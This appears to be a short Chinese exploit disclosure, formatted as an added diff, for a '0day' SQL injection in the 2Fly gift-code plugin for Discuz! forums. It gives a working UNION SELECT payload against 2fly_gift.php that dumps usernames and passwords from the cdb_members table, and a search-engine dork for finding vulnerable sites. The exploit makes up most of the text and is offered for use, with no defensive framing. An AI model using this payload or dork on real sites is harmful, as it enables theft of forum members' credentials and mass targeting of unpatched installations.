@@ -1,0 +1,9 @@
+Discuz!账号发放插件注入0day
+
+
+件名:2Fly礼品(序号)发放系统
+漏洞文件:2fly_gift.php
+作者：CN.Tnik&Tojen(俺俩老乡)
+版本:最新版
+Exp:http://www.xxx.com/2fly_gift.php?pages=content&gameid=16 and 1=2 union select 1,2,3,4,concat(username,0x3a,password),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37 from cdb_members
+搜索引擎特征:inurl:2fly_gift.php
